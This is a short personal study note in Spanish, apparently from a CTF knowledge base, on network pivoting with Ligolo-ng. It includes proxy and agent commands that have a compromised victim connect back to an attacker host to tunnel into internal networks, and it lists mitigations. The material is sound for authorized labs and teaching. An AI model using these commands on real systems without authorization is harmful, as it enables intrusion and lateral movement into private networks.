---
tags: [tecnica, pivoting, ligolo-ng]
tipo: tecnica
categoria: pivoting
estado: por-reforzar
maquinas: [THLCPPTV16]
---

# Pivoting con Ligolo-ng

## 1. Qué es

Túnel de red para alcanzar **redes internas** inaccesibles desde el atacante, usando un host comprometido como pivote.

## 2. Cómo funciona

- `proxy` en el atacante y `agent` en la víctima establecen un túnel.
- En la interfaz virtual de Ligolo se añaden **rutas** hacia las redes internas.

## 3. Cuándo sospecharla

- Hay servicios/redes internas que el atacante **no** alcanza directamente.
- Máquinas multi-host (THLCPPTV16).

## 4. Cómo comprobarla (laboratorio autorizado)

```bash
# Atacante
./proxy -selfcert -laddr 0.0.0.0:11601
# Victima (agent)
./agent -connect <IP_atacante>:11601 -ignore-cert
# En la sesion de Ligolo: session -> start, y anadir ruta a la red interna
```

## 5. Herramientas

- [[Ligolo-ng]], `ip route`, `tun` interface.

## 6. Ejemplos en mis CTF

| Máquina | Contexto | Resultado |
|---|---|---|
| [[THLCPPTV16]] | Pivote hacia hosts internos | acceso a Jerry y al host final |

## 7. Falsos positivos / pruebas fallidas

- Sin `-ignore-cert` (o sin aceptar el cert) el agent no conecta.
- No añadir la ruta deja la red interna inalcanzable.

## 8. Prevención y mitigación

- Microsegmentación, monitorización de túneles y de tráfico este-oeste.

## 9. Técnicas relacionadas

- [[WireGuard]], [[SSH-Keys]]
